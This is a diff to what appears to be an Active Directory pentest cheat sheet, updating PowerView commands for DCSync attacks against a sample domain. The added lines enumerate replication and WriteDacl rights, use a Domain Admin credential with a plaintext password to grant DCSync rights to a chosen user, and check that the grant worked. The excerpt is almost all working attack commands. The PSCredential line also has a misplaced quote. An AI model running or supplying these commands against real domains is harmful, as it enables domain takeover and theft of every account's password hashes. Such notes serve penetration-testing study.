@@ -498,13 +498,18 @@ Replicating Directory Changes All
 Replicating Directory Changes In Filtered Set
 
 # Enumerating DCSync user permissions with PowerView.ps1
+Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
+# Or
 Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 
 # Granting DCSync rights to any user using the Domain Admin user john and PowerView.ps1
 $Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
-Add-ObjectAcl -TargetDistinguishedName "dc=vorkharium,dc=com" -PrincipalSamAccountName newlyoverpowereduser -Rights DCSync -Verbose
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=vorkharium,DC=com" -PrincipalIdentity newlyoverpowereduser -Rights DCSync -Verbose
 # Check if the user successfully got DCSync rights
+Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | ?{$_.IdentityReference -match "newlyoverpowereduser"}
+# Or
 Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{$_.IdentityReference -match "newlyoverpowereduser"}
 
 # Remote DCSync
